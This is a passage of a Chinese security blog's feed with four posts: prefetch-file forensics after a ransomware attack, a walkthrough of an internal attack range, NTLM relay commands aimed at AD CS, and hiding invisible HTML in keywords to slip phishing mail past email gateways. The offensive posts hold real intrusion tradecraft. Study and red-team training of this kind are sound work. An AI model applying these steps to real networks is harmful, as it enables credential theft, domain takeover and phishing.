    <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Prefetch预读取文件，简称pf文件，是从Windows XP开始引入，作用是加速系统和应用程序启动过程。pf文件包含了可执行文件的名称、路径、调用DLL文件的列表、上次执行时间、运行次数等信息。简单来说，就相当于缓存。在Windows 7中可以记录128个条目，Windows 8&#x2F;10可记录1024个条目。pf文件存储在%SystemRoot%\Prefetch文件夹中。</p><p>简单来说pf文件就是程序执行的缓存记录，可以通过查看缓存记录进行分析。</p><h3 id="实战分析"><a href="#实战分析" class="headerlink" title="实战分析"></a>实战分析</h3><blockquote><p>当前机器被勒索，文件被加密，需要溯源分析。</p></blockquote><p>everything看到很多pf文件的缓存</p><p><img src="/2024/02/16/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-pf%E6%96%87%E4%BB%B6%E7%BC%93%E5%AD%98/image-20240216221122002.png" alt="image-20240216221122002"></p><p>这里看到有一些黑客工具的pf文件，mim.exe、netpass64，password64之类的，通过<code>PEcmd.exe</code>进行分析取证 <a href="https://github.com/EricZimmerman/PECmd">https://github.com/EricZimmerman/PECmd</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pecmd.exe -f CHROMEBASE.exe.pf --csv .</span><br></pre></td></tr></table></figure><p><img src="/2024/02/16/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-pf%E6%96%87%E4%BB%B6%E7%BC%93%E5%AD%98/image-20240216221547971.png" alt="image-20240216221547971"></p><p>通过列出的信息可以看到他访问了chrome的文件夹，通过这些目录分析，可以推测出这是个chrome信息获取的工具(在exe文件名不知道的情况下)，再看另外一个netpass.exe</p><p><img src="/2024/02/16/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-pf%E6%96%87%E4%BB%B6%E7%BC%93%E5%AD%98/image-20240216221837013.png" alt="image-20240216221837013"></p><p>可以看到他读取了administrator目录下appdata的一些本地凭证，还访问了mimik文件夹(mimik文件夹在应急中文件夹已经被删除)，通过这里分析出又做出一些本地密码抓取的行为，再结合其他的pf文件分析，就可以推断出攻击者做了哪些操作。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h3&gt;&lt;p&gt;Prefetch预读取文件，简称pf文件，是从Windows XP开始引入，作用是加速系统和应用程序启动过程。pf文件包含了可执行文件的名称</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>内网靶场（一）</title>
    <link href="https://www.jibochang.link/2024/01/23/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/"/>
    <id>https://www.jibochang.link/2024/01/23/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/</id>
    <published>2024-01-23T12:42:05.000Z</published>
    <updated>2024-01-23T12:51:05.261Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>最近公司内部开放了一些靶场给大家打，一周内打到靶标，目标是freey后台，过程要全程记录，上周和同事打到域就没打了，后面到靶标都是同事在打，过程很坎坷很贴合实战，很多坑没写出来， 攻击路径还是蛮长的，差点就打不完了，用时一周。</p><p>攻击路径如下：</p><p>禅道-&gt;zabbix-&gt;nacos-&gt;linux入域机器-&gt;域控-&gt;运维机-&gt;VPN到靶标</p><p>这周还有一个靶场，在我写这篇文章的时候已经打下靶标，用时2天。</p><h3 id="0x01-入口点"><a href="#0x01-入口点" class="headerlink" title="0x01 入口点"></a>0x01 入口点</h3><p>入口点是个禅道，历史漏洞失败，看到有个adminer</p><p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/image-20240123195758807.png" alt="image-20240123195758807"></p><p>打开之后有个401认证，账号密码都是admin</p><p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/image-20240123200050674.png" alt="image-20240123200050674"></p><p>打开之后adminer版本为4.7.7，历史漏洞都不行，尝试使用弱口令爆破，当时有个坑，这里server没填端口，爆破了几万条都没出来，后面填上直接弱口令admin 123456就进去了。。</p><p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/image-20240123200153594.png" alt="image-20240123200153594"></p><p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/image-20240123200246085.png" alt="image-20240123200246085"></p><p>在数据库的表中找到后台的账号密码，然后拿去解密md5</p><p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/image-20240123200319864.png" alt="image-20240123200319864"></p><p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/image-20240123200346504.png" alt="image-20240123200346504"></p><p>密码为xxx@.123，进入后台之后直接命令执行上线cs</p><p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/image-20240123200509105.png" alt="image-20240123200509105"></p><p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/image-20240123200518180.png" alt="image-20240123200518180"></p><p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/image-20240123200524188.png" alt="image-20240123200524188"></p><p>上线之后发现系统为centos6，用sudo提权到root</p><p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/image-20240123200606875.png" alt="image-20240123200606875"></p><h3 id="0x02-内网横向"><a href="#0x02-内网横向" class="headerlink" title="0x02 内网横向"></a>0x02 内网横向</h3><p>到内网后就对172.24段扫描，发现有nacos、zabbix和minio，nacos有权限绕过，进入后台并未发现有什么东西</p><p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/image-20240123200749397.png" alt="image-20240123200749397"></p><p>nacos无果转zabbix，弱口令失败，尝试爆破密码，根据前面密码xxx@.123，判断前面的xxx@不会变，后面的.123可能是主机ip(因为前面禅道的后台密码和上线ip是一致的)，成功爆破出xxx@.010，通过反弹shell上线nacos、minio和zabbix</p><p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/image-20240123201022536.png" alt="image-20240123201022536"></p><p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/image-20240123201101989.png" alt="image-20240123201101989"></p><p>在zabbix和minio信息收集没发现什么，在nacos上用pwnkit提权到root，在&#x2F;home&#x2F;xxx&#x2F;.ssh&#x2F;发现有公私钥</p><p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/image-20240123201255622.png" alt="image-20240123201255622"></p><p>通过ssh上线发现为双网卡，还有一个192.168.20的段</p><p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/image-20240123201324568.png" alt="image-20240123201324568"></p><p>接着对该机器进行提权，pwnkit，sudo提权都失败，通过查找suid，找到find命令设置了S属性，提权到root</p><p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/image-20240123201509592.png" alt="image-20240123201509592"></p><p>然后对当前机器信息收集，发现网络连接有和192.168.20.x的389端口通信，熟悉域的都知道这是ldap端口，猜测当前机器可能加入到域。在&#x2F;etc目录下看到有krb5.conf配置文件，当前域为template.local</p><p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/image-20240123201644002.png" alt="image-20240123201644002"></p><p>etc下还有个krb5.keytab，通过keytabextract.py解析获得hash，成功获得域账户</p><p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/image-20240123201731809.png" alt="image-20240123201731809"></p><h3 id="0x03-域横向"><a href="#0x03-域横向" class="headerlink" title="0x03 域横向"></a>0x03 域横向</h3><p>使用当前账户枚举域内信息</p><p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/image-20240123201903580.png" alt="image-20240123201903580"></p><p>发现存在一个域管tpadmins</p><p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/image-20240123201931244.png" alt="image-20240123201931244"></p><p>域内有三台机器，win10、域控和当前的linux</p><p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/image-20240123201951057.png" alt="image-20240123201951057"></p><p>前期在对入域的linux的机器信息收集时发现，在home目录下有tpadmins的文件夹，说明有登陆过当前主机，并且查询到当前机器有sssd服务</p><p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/image-20240123202152711.png" alt="image-20240123202152711"></p><p>通过工具抓取sssd内存中凭证，成功抓到tpadmins的hash</p><p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/image-20240123202217975.png" alt="image-20240123202217975"></p><p>本地对hash进行破解，解密出明文Admin@1234</p><p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/image-20240123202256880.png" alt="image-20240123202256880"></p><p>通过tpadmins账户直接上线域控</p><p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/image-20240123202324519.png" alt="image-20240123202324519"></p><p>前期扫描并未发现win10主机的ip地址，通过dig反查出ip，再通过全端口扫描发现开启了5985(winrm)，通过winrm横向上线cs</p><p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/image-20240123202517826.png" alt="image-20240123202517826"></p><p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/image-20240123202535875.png" alt="image-20240123202535875"></p><p>抓取浏览器密码没抓到东西，因为用的是域管的账号，后面用yunwei这个域账号去抓就抓到了凭证和记录</p><p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/image-20240123202651889.png" alt="image-20240123202651889"></p><p>在桌面上看到有个kdbx的文件，是keepass的数据库工具，通过上面抓的密码pt打开到数据库，并获取到了vpn和ferry的密码</p><p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/image-20240123202747339.png" alt="image-20240123202747339"></p><p>之后通过vpn接入成功拿到靶标后台</p><p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/image-20240123202817555.png" alt="image-20240123202817555"></p><p>列一下成果</p><p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/image-20240123203100772.png" alt="image-20240123203100772"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h3&gt;&lt;p&gt;最近公司内部开放了一些靶场给大家打，一周内打到靶标，目标是freey后台，过程要全程记录，上周和同事</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>实战relay打法</title>
    <link href="https://www.jibochang.link/2023/11/26/%E5%AE%9E%E6%88%98%E6%89%93ntlmrelay/"/>
    <id>https://www.jibochang.link/2023/11/26/%E5%AE%9E%E6%88%98%E6%89%93ntlmrelay/</id>
    <published>2023-11-26T15:35:05.000Z</published>
    <updated>2023-11-26T15:38:20.238Z</updated>
    
    <content type="html"><![CDATA[<p>网上关于relay的文章很多，但都是基于内网靶场的，并没有基于实战的环境进行讲解，在此特地复现实战环境进行配置relay所需要的设置</p><p>域控：10.10.10.1</p><p>辅域：10.10.10.2</p><p>被控机：10.10.10.10</p><p>VPS：1.1.1.1</p><h3 id="上传驱动文件"><a href="#上传驱动文件" class="headerlink" title="上传驱动文件"></a>上传驱动文件</h3><p>可以使用PortBender、DivertTCPconn进行转发，本次使用的是PortBender，需要先上传驱动文件</p><p><img src="/2023/11/26/%E5%AE%9E%E6%88%98%E6%89%93ntlmrelay/image-20231126232254156.png" alt="image-20231126232254156"></p><p>根据实战环境上传对应版本驱动</p><h3 id="端口重定向"><a href="#端口重定向" class="headerlink" title="端口重定向"></a>端口重定向</h3><p>之后通过cs设置端口转发，将10.10.10.10的445转发到8445端口，需要注意的是PortBender 执行需要管理权限，且需在 WinDivert64.sys 同一目录下执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PortBender redirect 445 8445</span><br></pre></td></tr></table></figure><p><img src="/2023/11/26/%E5%AE%9E%E6%88%98%E6%89%93ntlmrelay/image-20231126232336670.png" alt="image-20231126232336670"></p><h3 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h3><p>再通过cs的rportfwd将10.10.10.10的8445转发到cs的445上</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rportfwd 8445 1.1.1.1 445</span><br></pre></td></tr></table></figure><p><img src="/2023/11/26/%E5%AE%9E%E6%88%98%E6%89%93ntlmrelay/image-20231126232639020.png" alt="image-20231126232639020"></p><h3 id="设置监听"><a href="#设置监听" class="headerlink" title="设置监听"></a>设置监听</h3><p>上面设置了之后会将10.10.10.10的流量转发到1.1.1.1上，因为实战中vps是访问不到内网的，所以需要在VPS中也配置一个proxychains</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 ntlmrelayx.py -t http://10.10.10.1/certsrv/certfnsh.asp -smb2support --adcs --template domaincontroller</span><br></pre></td></tr></table></figure><p><img src="/2023/11/26/%E5%AE%9E%E6%88%98%E6%89%93ntlmrelay/image-20231126232825126.png" alt="image-20231126232825126"></p><h3 id="强制认证"><a href="#强制认证" class="headerlink" title="强制认证"></a>强制认证</h3><p>最后再通过本地打强制认证</p><p><img src="/2023/11/26/%E5%AE%9E%E6%88%98%E6%89%93ntlmrelay/image-20231126232926147.png" alt="image-20231126232926147"></p><p>打了之后在cs可以看到有流量过来</p><p><img src="/2023/11/26/%E5%AE%9E%E6%88%98%E6%89%93ntlmrelay/image-20231126232943632.png" alt="image-20231126232943632"></p><p>再去看vps上已经成功relay</p><p><img src="/2023/11/26/%E5%AE%9E%E6%88%98%E6%89%93ntlmrelay/image-20231126233050537.png" alt="image-20231126233050537"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;网上关于relay的文章很多，但都是基于内网靶场的，并没有基于实战的环境进行讲解，在此特地复现实战环境进行配置relay所需要的设置&lt;/p&gt;
&lt;p&gt;域控：10.10.10.1&lt;/p&gt;
&lt;p&gt;辅域：10.10.10.2&lt;/p&gt;
&lt;p&gt;被控机：10.10.10.10&lt;/p&gt;
&lt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>绕过邮件网关关键字拦截</title>
    <link href="https://www.jibochang.link/2023/07/11/%E7%BB%95%E8%BF%87%E9%82%AE%E7%AE%B1%E7%BD%91%E5%85%B3%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4/"/>
    <id>https://www.jibochang.link/2023/07/11/%E7%BB%95%E8%BF%87%E9%82%AE%E7%AE%B1%E7%BD%91%E5%85%B3%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4/</id>
    <published>2023-07-11T13:10:05.000Z</published>
    <updated>2023-07-11T14:00:32.872Z</updated>
    
    <content type="html"><![CDATA[<p>很多邮件网关都会有设置一些拦截关键字的行为，比如附件、密码、补贴等</p><p>先贴上一张效果图</p><p><img src="/2023/07/11/%E7%BB%95%E8%BF%87%E9%82%AE%E7%AE%B1%E7%BD%91%E5%85%B3%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4/image-20230711203343614.png" alt="image-20230711203343614"></p><p>看起来是很正常的，但是从微信提示看就不一样了</p><p><img src="/2023/07/11/%E7%BB%95%E8%BF%87%E9%82%AE%E7%AE%B1%E7%BD%91%E5%85%B3%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4/image-20230711204038300.png" alt="image-20230711204038300"></p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>其实原理很简单，就是在html代码中添加一段不可见的内容</p><p><img src="/2023/07/11/%E7%BB%95%E8%BF%87%E9%82%AE%E7%AE%B1%E7%BD%91%E5%85%B3%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4/image-20230711203537263.png" alt="image-20230711203537263"></p><p>问一下GPT</p><p><img src="/2023/07/11/%E7%BB%95%E8%BF%87%E9%82%AE%E7%AE%B1%E7%BD%91%E5%85%B3%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4/image-20230711203719805.png" alt="image-20230711203719805"></p><p>所以就会导致在邮件正文打开看起来是正常的，但实际上里面在关键字中插入内容是可以绕过邮件网关拦截的</p><p>附上一张实际效果图，真实环境，重码</p><p><img src="/2023/07/11/%E7%BB%95%E8%BF%87%E9%82%AE%E7%AE%B1%E7%BD%91%E5%85%B3%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4/image-20230711203953666.png" alt="image-20230711203953666"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;很多邮件网关都会有设置一些拦截关键字的行为，比如附件、密码、补贴等&lt;/p&gt;
&lt;p&gt;先贴上一张效果图&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2023/07/11/%E7%BB%95%E8%BF%87%E9%82%AE%E7%AE%B1%E7%BD%91%E5%85%B3%E5%</summary>
      
    
    
    
    
  </entry>
  
</feed>
